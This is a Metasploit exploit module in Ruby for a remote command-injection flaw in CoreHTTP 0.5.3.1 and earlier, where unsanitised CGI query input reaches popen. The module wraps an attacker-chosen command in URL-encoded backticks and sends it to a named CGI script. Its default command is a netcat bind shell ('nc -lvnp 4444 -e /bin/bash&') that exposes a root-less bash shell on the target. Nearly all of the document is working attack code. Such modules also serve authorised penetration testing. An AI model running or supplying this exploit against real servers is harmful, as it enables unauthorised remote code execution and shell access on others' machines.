###
## MSF Exploit for CoreHTTP CGI Enabled Remote Arbitrary Command Execution
## CoreHTTP fails to properly sanitize user input before passing it to popen,
## allowing anyone with a web browser to run arbitrary commands.
## No CVE for this yet.
###

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'corehttp remote command execution',
			'Description'	=> %q{
				This module exploits a remote command execution vulnerability in corehttp versions 0.5.3.1 and earlier.
				It requires that you know the name of a cgi file on the server.
				NOTE: If you want to do something more than remote shell, you'll have to change CGICMD
			},
			'Author'	=> [ 'Aaron Conole' ],
			'License'	=> MSF_LICENSE,
			'Version'	=> '$Revision:$',
			'References'	=>
				[
					[ 'URL', 'http://aconole.brad-x.com/advisories/corehttp.txt' ],
                                        [ 'URL', 'http://corehttp.sourceforge.net' ],
				],
			'Priviledged'	=> false,
			'Payload'	=>
				{
					'Space'       => 1024,
				},
			'Platform'       => 'php',
			'Arch'           => ARCH_PHP,
			'Targets'        => [[ 'Automatic', { }]],
			'DefaultTarget' => 0))
			
			register_options(
				[
					OptString.new('CGIURI', [true, "The URI of the CGI file to request", "/foo.pl"]),
					OptString.new('CGICMD', [true, "The command to execute on the remote machine (note: it doesn't support redirection)", "nc -lvnp 4444 -e /bin/bash&"])
				], self.class)

	end

	def exploit

		timeout = 0.01

		print_status ("Building URI")

		uri = ""
		uri = uri.concat(datastore['CGIURI'])
		uri = uri.concat("?%60")
		uri.concat(datastore['CGICMD'])
		uri = uri.gsub(" ", "%20")
		uri.concat("%60")
		uri = uri.gsub("&", "%26")

		print_status("Trying URI #{uri}")

		response = send_request_raw({ 'uri' => uri}, timeout)

		handler
	end

end
